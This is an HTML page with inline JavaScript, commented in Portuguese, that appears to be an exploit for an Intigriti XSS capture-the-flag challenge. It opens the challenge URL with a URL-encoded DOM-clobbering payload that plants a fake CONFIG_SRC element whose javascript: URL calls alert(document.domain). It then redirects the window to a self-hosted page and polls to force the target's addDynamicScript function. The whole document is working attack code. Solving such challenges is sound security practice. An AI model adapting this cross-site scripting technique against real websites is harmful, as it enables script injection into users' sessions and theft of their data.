<!DOCTYPE html>
<html>
<body>
<script>
    const targetUrl = "https://challenge-0525.intigriti.io/begin?name=%3C%2Fstrong%3E%3Cdiv%20id%3Dstrong%3E%3C%2Fdiv%3E%3Cdiv%20id%3DCONFIG_SRC%20data-url%3Djavascript:alert(document.domain)%3Etest%3C%2Fdiv%3E%3Cstrong%3Ea";
    const backUrl = "https://yourdomain.com/back.html?n=1"; // ✅ Substitua pelo back.html hospedado em seu domínio

    const w = window.open(targetUrl);

    // Função para tentar forçar o XSS via addDynamicScript
    function tryTrigger() {
        try {
            if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
                console.log("✅ Triggering addDynamicScript...");
                w.addDynamicScript();
                observer.disconnect(); // Para de observar após sucesso
            }
        } catch (e) {
            // Cross-origin ou ainda não carregou, ignora
        }
    }

    // MutationObserver para monitorar o DOM remoto
    const observer = new MutationObserver(tryTrigger);

    // Tenta iniciar o observer após a navegação
    setTimeout(() => {
        try {
            w.location = backUrl;
            w.addEventListener('DOMContentLoaded', () => {
                const doc = w.document;
                if (doc) {
                    observer.observe(doc, { childList: true, subtree: true });
                }
            });
        } catch (e) {}
    }, 3000);

    // Também tenta de forma proativa a cada 1 segundo
    const proactive = setInterval(() => {
        tryTrigger();
    }, 1000);
</script>
</body>
</html>
